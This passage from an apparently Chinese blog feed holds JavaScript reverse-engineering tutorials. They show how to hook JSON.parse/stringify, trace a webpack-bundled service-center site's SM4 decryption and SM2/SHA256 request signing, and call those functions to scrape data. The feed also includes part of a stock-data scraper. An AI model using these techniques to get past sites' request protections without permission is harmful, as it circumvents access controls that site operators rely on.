class="string">&#x27;成交数量&#x27;</span>, <span class="string">&#x27;成交金额&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;交易所&#x27;</span>, <span class="string">&#x27;币种&#x27;</span></span><br><span class="line">            ]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 保留所有列，但把重要的放前面</span></span><br><span class="line">            other_columns = [col <span class="keyword">for</span> col <span class="keyword">in</span> df.columns <span class="keyword">if</span> col <span class="keyword">not</span> <span class="keyword">in</span> column_order]</span><br><span class="line">            df = df[column_order + other_columns]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 生成文件名（带时间戳）</span></span><br><span class="line">            timestamp = datetime.now().strftime(<span class="string">&quot;%Y%m%d_%H%M%S&quot;</span>)</span><br><span class="line">            filename = <span class="string">f&quot;深证信数据_<span class="subst">&#123;data[<span class="string">&#x27;market&#x27;</span>]&#125;</span>_<span class="subst">&#123;data[<span class="string">&#x27;tdate&#x27;</span>].replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#x27;</span>)&#125;</span>_<span class="subst">&#123;timestamp&#125;</span>.xlsx&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 保存为 Excel</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;💾 正在保存到 Excel 文件: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 使用 ExcelWriter 以便设置格式</span></span><br><span class="line">            <span class="keyword">with</span> pd.ExcelWriter(filename, engine=<span class="string">&#x27;openpyxl&#x27;</span>) <span class="keyword">as</span> writer:</span><br><span class="line">                df.to_excel(writer, sheet_name=<span class="string">&#x27;股票数据&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 获取工作表对象</span></span><br><span class="line">                worksheet = writer.sheets[<span class="string">&#x27;股票数据&#x27;</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 自动调整列宽</span></span><br><span class="line">                <span class="keyword">for</span> column <span class="keyword">in</span> df.columns:</span><br><span class="line">                    column_idx = df.columns.get_loc(column)</span><br><span class="line">                    max_length = <span class="built_in">max</span>(</span><br><span class="line">                        df[column].astype(<span class="built_in">str</span>).apply(<span class="built_in">len</span>).<span class="built_in">max</span>(),  <span class="comment"># 数据最大长度</span></span><br><span class="line">                        <span class="built_in">len</span>(<span class="built_in">str</span>(column))  <span class="comment"># 列名长度</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="comment"># 设置列宽（加一点余量）</span></span><br><span class="line">                    worksheet.column_dimensions[<span class="built_in">chr</span>(<span class="number">65</span> + column_idx)].width = <span class="built_in">min</span>(max_length + <span class="number">2</span>, <span class="number">50</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 冻结首行</span></span><br><span class="line">                worksheet.freeze_panes = <span class="string">&#x27;A2&#x27;</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 添加筛选</span></span><br><span class="line">                worksheet.auto_filter.ref = worksheet.dimensions</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 数据已成功保存到: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n📋 数据预览（前5条）:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(df.head().to_string())</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n📈 数据统计:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 总行数: <span class="subst">&#123;<span class="built_in">len</span>(df)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 总列数: <span class="subst">&#123;<span class="built_in">len</span>(df.columns)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 涨停股票: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;涨跌幅&#x27;</span>] &gt;= <span class="number">9.9</span>])&#125;</span> 只&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 跌停股票: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;涨跌幅&#x27;</span>] &lt;= -<span class="number">9.9</span>])&#125;</span> 只&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 上涨股票: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;涨跌&#x27;</span>] &gt; <span class="number">0</span>])&#125;</span> 只&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 下跌股票: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;涨跌&#x27;</span>] &lt; <span class="number">0</span>])&#125;</span> 只&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   - 平盘股票: <span class="subst">&#123;<span class="built_in">len</span>(df[df[<span class="string">&#x27;涨跌&#x27;</span>] == <span class="number">0</span>])&#125;</span> 只&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;❌ 没有获取到数据&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 请求失败: <span class="subst">&#123;result.get(<span class="string">&#x27;resultmsg&#x27;</span>, <span class="string">&#x27;未知错误&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;❌ 处理数据时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;原始响应: <span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221453689.png" alt="image-20251030221453689"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030232510951.png" alt="image-20251030232510951"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030232442372.png" alt="image-20251030232442372"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;逆向点，请求头有个加密的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251030221604677.png&quot; alt=&quot;image-2</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-某某服务中心定点查询webpack逆向</title>
    <link href="https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/"/>
    <id>https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/</id>
    <published>2025-10-28T09:23:40.000Z</published>
    <updated>2025-10-30T15:40:55.927Z</updated>
    
    <content type="html"><![CDATA[<p>接口是查询</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172514877.png" alt="image-20251028172514877"></p><p>发现请求和响应分别都有加密</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172615657.png" alt="image-20251028172615657"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172633150.png" alt="image-20251028172633150"></p><h1 id="响应解密"><a href="#响应解密" class="headerlink" title="响应解密"></a>响应解密</h1><p>首先做响应解密，根据经验，解密直接hook json.parse。也可以直接搜索 json.parse。</p><h2 id="json-hook技术"><a href="#json-hook技术" class="headerlink" title="json hook技术"></a>json hook技术</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> my_stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line"><span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span> (<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="comment">// 这里可以添加其他逻辑比如</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;json_stringify params:&quot;</span>,params);</span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">my_stringify</span>(params);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> my_parse = <span class="title class_">JSON</span>.<span class="property">parse</span>;</span><br><span class="line"><span class="title class_">JSON</span>.<span class="property">parse</span> = <span class="keyword">function</span> (<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="comment">// 这里可以添加其他逻辑比如</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;json_parse params:&quot;</span>,params);</span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">my_parse</span>(params);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我理解的就是最后返回给我们的是json格式，最后做了一下格式转换这样的操作把解密之后的数据展示到前端。如果我们定位到了他使用此函数开始把解密的数据展示到前端了，那么往前跟一下堆栈，就能找到解密的操作。</p><h3 id="控制台输入hook"><a href="#控制台输入hook" class="headerlink" title="控制台输入hook"></a>控制台输入hook</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173150138.png" alt="image-20251028173150138"></p><p>断点到已经解密后的内容。</p><p>像这种还是密文的，直接略过。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173304161.png" alt="image-20251028173304161"></p><p>断点。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175813605.png" alt="image-20251028175813605"></p><p>点击右侧堆栈，定位。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173524092.png" alt="image-20251028173524092"></p><p>直接发现了s.decrypt(n, t)函数。断点到之前和之后，看一下是不是这个函数做的解密。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028173908859.png" alt="image-20251028173908859"></p><p>进入decrypt函数。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028174228511.png" alt="image-20251028174228511"></p><p>其实这里再往前跟一段的话，是这样。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028174752281.png" alt="image-20251028174752281"></p><p>就是调用function g(t, n)函数，那么思路来了，我们把内容使用这个函数进行调用那不就行了，直接解密，调用function g(t, n)函数之后还有返回值，美滋滋。</p><p>但是他调用的时候是u.b调用的，我们往上看一下。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028174945573.png" alt="image-20251028174945573"></p><p>这里说明了，u.b那就是g函数。而且很明显有键值的，是webpack打包过的，拉到最上面，加载器也找到了，调用的时候声明个全局变量，然后就能使用g函数了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175042657.png" alt="image-20251028175042657"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="title function_">qifei</span>(<span class="string">&quot;7d92&quot;</span>))</span><br><span class="line">u=<span class="variable language_">window</span>.<span class="title function_">qifei</span>(<span class="string">&quot;7d92&quot;</span>)</span><br><span class="line">e=&#123;</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;signData&quot;</span>: <span class="string">&quot;79uO2S50Sf+V6QfNW022wnJQPpV/geXXRGcfPBhGnScEc48t42kNfe/dnvJiir97mXQq3O06lMMpU8471KGcIw==&quot;</span>,</span><br><span class="line">        <span class="string">&quot;encType&quot;</span>: <span class="string">&quot;SM4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;encData&quot;</span>: <span class="string">&quot;943195DDA5E5337E08E0A527071CC637E0074CBD73D293A3643B2199C79561872E19ABE7BB2600D23E9CDB14C1A75194C1D3C735D2DCC50E297311A423B72BF0AE4781F770874C1AC923AD26618311F1E72934E0FFBB639208EEADCEC17176865992EA3D73E612B17DA2C...........&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;signType&quot;</span>: <span class="string">&quot;SM2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;appCode&quot;</span>: <span class="string">&quot;T98HPCGN5ZVVQBS8LZQNOAEXVI9GYHKQ&quot;</span>,</span><br><span class="line">        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1761618110191&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;成功&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1761618110&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;success&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(u.<span class="title function_">b</span>(<span class="string">&quot;SM4&quot;</span>,e))</span><br></pre></td></tr></table></figure><p>注意1：把初始化的地方注释掉。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175428054.png" alt="image-20251028175428054"></p><p>注意2：我在加载器下面写了声明。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175543095.png" alt="image-20251028175543095"></p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028175623315.png" alt="image-20251028175623315"></p><h1 id="请求包加密"><a href="#请求包加密" class="headerlink" title="请求包加密"></a>请求包加密</h1><p>这里我是要json hook定位。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> my_stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line"><span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span> (<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="comment">// 这里可以添加其他逻辑比如</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;json_stringify params:&quot;</span>,params);</span><br><span class="line">  <span class="keyword">debugger</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">my_stringify</span>(params);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180031974.png" alt="image-20251028180031974"></p><p>往上跟堆栈</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180347822.png" alt="image-20251028180347822"></p><p>发现下面有个encData,很可疑。</p><p>发现这里也触发了hook。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180523332.png" alt="image-20251028180523332"></p><p>往下走，发现l值就是我们的加密的数据。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028180658322.png" alt="image-20251028180658322"></p><p>看整个   function f(t)函数，就是对请求包做一些处理，因为这里是一个函数，我们是否可以直接调用，直接把完美的加密请求给我们。注意需要传入的东西就是下面这个格式，爬虫的时候改下面就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&quot;addr&quot;:&quot;&quot;,&quot;regnCode&quot;:&quot;140100&quot;,&quot;medinsName&quot;:&quot;&quot;,&quot;medinsLvCode&quot;:&quot;&quot;,&quot;medinsTypeCode&quot;:&quot;&quot;,&quot;outMedOpenFlag&quot;:&quot;&quot;,&quot;pageNum&quot;:1,&quot;pageSize&quot;:10,&quot;queryDataSource&quot;:&quot;es&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181006327.png" alt="image-20251028181006327"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = <span class="title function_">n</span>(<span class="string">&quot;6c27&quot;</span>).<span class="property">sha256</span></span><br><span class="line">      , s = <span class="title class_">Math</span>.<span class="title function_">ceil</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() / <span class="number">1e3</span>)</span><br><span class="line">      , h = <span class="title class_">Object</span>(i.<span class="property">a</span>)()</span><br><span class="line">      , f = s + h + s;</span><br><span class="line">    <span class="keyword">return</span> t.<span class="property">headers</span>[<span class="string">&quot;x-tif-paasid&quot;</span>] = l.<span class="property">paasId</span>,</span><br><span class="line">    t.<span class="property">headers</span>[<span class="string">&quot;x-tif-signature&quot;</span>] = <span class="title function_">r</span>(f),</span><br><span class="line">    t.<span class="property">headers</span>[<span class="string">&quot;x-tif-timestamp&quot;</span>] = s,</span><br><span class="line">    t.<span class="property">headers</span>[<span class="string">&quot;x-tif-nonce&quot;</span>] = h,</span><br><span class="line">    t.<span class="property">headers</span>.<span class="property">Accept</span> = <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    t.<span class="property">headers</span>.<span class="property">contentType</span> = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    t.<span class="property">data</span> = &#123;</span><br><span class="line">        <span class="attr">data</span>: t.<span class="property">data</span> || &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">appCode</span> = l.<span class="property">appCode</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">version</span> = l.<span class="property">version</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">encType</span> = <span class="string">&quot;SM4&quot;</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">signType</span> = <span class="string">&quot;SM2&quot;</span>,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">timestamp</span> = s,</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">signData</span> = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title function_">m</span>(t.<span class="property">data</span>)</span><br><span class="line">              , i = <span class="title function_">p</span>(n);</span><br><span class="line">            i.<span class="property">data</span> = <span class="title function_">p</span>(i.<span class="property">data</span>);</span><br><span class="line">            <span class="keyword">var</span> r = <span class="title function_">v</span>(i)</span><br><span class="line">              , a = o.<span class="title function_">doSignature</span>(r, d, &#123;</span><br><span class="line">                <span class="attr">hash</span>: !<span class="number">0</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">from</span>(a, <span class="string">&quot;hex&quot;</span>).<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;(t),</span><br><span class="line">    t.<span class="property">data</span>.<span class="property">data</span> = &#123;</span><br><span class="line">        <span class="attr">encData</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (e.<span class="title function_">toUpperCase</span>()) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;SM2&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = o.<span class="title function_">generateKeyPairHex</span>()</span><br><span class="line">                          , n = t.<span class="property">publicKey</span></span><br><span class="line">                          , i = e;</span><br><span class="line">                        o.<span class="title function_">doEncrypt</span>(i, n, <span class="number">1</span>)</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;(t);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;SM3&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = <span class="title function_">a</span>(e);</span><br><span class="line">                        <span class="keyword">return</span> t</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;(t);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;SM4&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">data</span>.<span class="property">data</span> &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e.<span class="property">data</span>.<span class="property">data</span>), n = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i)</span><br><span class="line">                              , o = t.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">                            n += o &gt; <span class="number">127</span> ? <span class="string">&quot;\\u&quot;</span> + o.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">4</span>, <span class="string">&quot;0&quot;</span>) : r</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">var</span> a = <span class="title function_">A</span>(n);</span><br><span class="line">                        e.<span class="property">data</span>.<span class="property">appCode</span> &amp;&amp; e.<span class="property">data</span>.<span class="property">appCode</span> !== u &amp;&amp; (u = e.<span class="property">data</span>.<span class="property">appCode</span>);</span><br><span class="line">                        <span class="keyword">var</span> s = <span class="title function_">y</span>(u, c)</span><br><span class="line">                          , l = <span class="title function_">b</span>(s, a);</span><br><span class="line">                        <span class="keyword">return</span> l.<span class="title function_">toUpperCase</span>()</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">                &#125;(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;(<span class="string">&quot;SM4&quot;</span>, t)</span><br><span class="line">    &#125;,</span><br><span class="line">    t.<span class="property">data</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">data</span>: t.<span class="property">data</span></span><br><span class="line">    &#125;),</span><br><span class="line">    t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往上跟堆栈发现，是如此调用的。u.a是否跟上文u.b一样。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181048767.png" alt="image-20251028181048767"></p><p>我们看到我们需要调用u.a来调用function f(t)函数。</p><p>那么就明了了，测试出结果。</p><h1 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181252843.png" alt="image-20251028181252843"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181315535.png" alt="image-20251028181315535"></p><p>看一下第二页是否对应。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181411153.png" alt="image-20251028181411153"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181526726.png" alt="image-20251028181526726"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028181515681.png" alt="image-20251028181515681"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;接口是查询&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251028172514877.png&quot; alt=&quot;image-202510281</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>js逆向-某某Meta登录Webpack逆向</title>
    <link href="https://250wuyifan.github.io/2025/10/27/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90Meta%E7%99%BB%E5%BD%95Webpack%E9%80%86%E5%90%91/"/>
    <id>https://250wuyifan.github.io/2025/10/27/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90Meta%E7%99%BB%E5%BD%95Webpack%E9%80%86%E5%90%91/</id>
    <published>2025-10-27T15:47:45.000Z</published>
    <updated>2025-10-27T15:50:38.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.52pojie.cn/thread-2065436-1-1.html">https://www.52pojie.cn/thread-2065436-1-1.html</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027234923867.png" alt="image-20251027234923867"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027234831011.png" alt="image-20251027234831011"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251027234850985.png" alt="image-20251027234850985"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 